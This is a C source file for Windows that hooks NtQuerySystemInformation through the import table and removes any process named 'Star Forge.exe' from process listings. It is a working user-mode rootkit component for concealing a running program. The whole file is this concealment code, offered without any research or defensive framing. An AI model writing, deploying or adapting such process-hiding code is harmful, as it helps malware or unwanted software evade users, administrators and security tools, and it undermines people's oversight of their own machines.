#ifndef LOCALE_ORDINAL
#define LOCALE_ORDINAL 0x00000040
#endif
#include <Windows.h>
#include <winternl.h>

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(WINAPI* pfnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

pfnNtQuerySystemInformation RealNtQuerySystemInformation = NULL;

typedef struct _REAL_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} REAL_SYSTEM_PROCESS_INFORMATION, * PREAL_SYSTEM_PROCESS_INFORMATION;

// CRT-free string compare — replaces strcmp
static int _strcmp_crtfree(const char* a, const char* b) {
    while (*a && (*a == *b)) { a++; b++; }
    return *(unsigned char*)a - *(unsigned char*)b;
}

// CRT-free case-insensitive compare — replaces _stricmp
static int _stricmp_crtfree(const char* a, const char* b) {
    return lstrcmpiA(a, b);
}

void Begin_Hook() {
    HMODULE hDllHandle = GetModuleHandleW(NULL);
    PBYTE BaseAddress = (PBYTE)hDllHandle;
    PIMAGE_DOS_HEADER pimgDos = (PIMAGE_DOS_HEADER)BaseAddress;
    PIMAGE_NT_HEADERS pimgNt = (PIMAGE_NT_HEADERS)(BaseAddress + pimgDos->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pimgOpt = (PIMAGE_OPTIONAL_HEADER) & (pimgNt->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR pimgImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(
        BaseAddress + pimgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; pimgImportDescriptor->Characteristics; pimgImportDescriptor++) {
        if (!_stricmp_crtfree((PCHAR)(BaseAddress + pimgImportDescriptor->Name), "ntdll.dll"))
            break;
    }

    if (!pimgImportDescriptor->Characteristics) return;

    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pimgFirstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->FirstThunk);
    PIMAGE_IMPORT_BY_NAME NamesArray = NULL;

    while (thunk && thunk->u1.AddressOfData != 0) {
        if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
            NamesArray = (PIMAGE_IMPORT_BY_NAME)(BaseAddress + thunk->u1.AddressOfData);
            if (_strcmp_crtfree((PCHAR)NamesArray->Name, "NtQuerySystemInformation") == 0)
                break;
        }
        ++thunk;
        ++pimgFirstThunk;
    }

    RealNtQuerySystemInformation = (pfnNtQuerySystemInformation)pimgFirstThunk->u1.Function;
    DWORD oldProtect = 0;
    VirtualProtect(&pimgFirstThunk->u1.Function, sizeof(uintptr_t), PAGE_READWRITE, &oldProtect);
    pimgFirstThunk->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
    VirtualProtect(&pimgFirstThunk->u1.Function, sizeof(uintptr_t), oldProtect, &oldProtect);
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = RealNtQuerySystemInformation(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);

    if (status == 0 && SystemInformationClass == (SYSTEM_INFORMATION_CLASS)5) {
        PREAL_SYSTEM_PROCESS_INFORMATION current = NULL;
        PREAL_SYSTEM_PROCESS_INFORMATION next =
            (PREAL_SYSTEM_PROCESS_INFORMATION)SystemInformation;
        do {
            current = next;
            next = (PREAL_SYSTEM_PROCESS_INFORMATION)
                ((PUCHAR)current + current->NextEntryOffset);
            if (next->ImageName.Buffer &&
                CompareStringW(LOCALE_ORDINAL, NORM_IGNORECASE,
                    next->ImageName.Buffer,
                    next->ImageName.Length / sizeof(WCHAR),
                    L"Star Forge.exe", 14) == CSTR_EQUAL) {
                if (next->NextEntryOffset == 0)
                    current->NextEntryOffset = 0;
                else
                    current->NextEntryOffset += next->NextEntryOffset;
                next = current;
            }
        } while (current->NextEntryOffset != 0);
    }
    return status;
}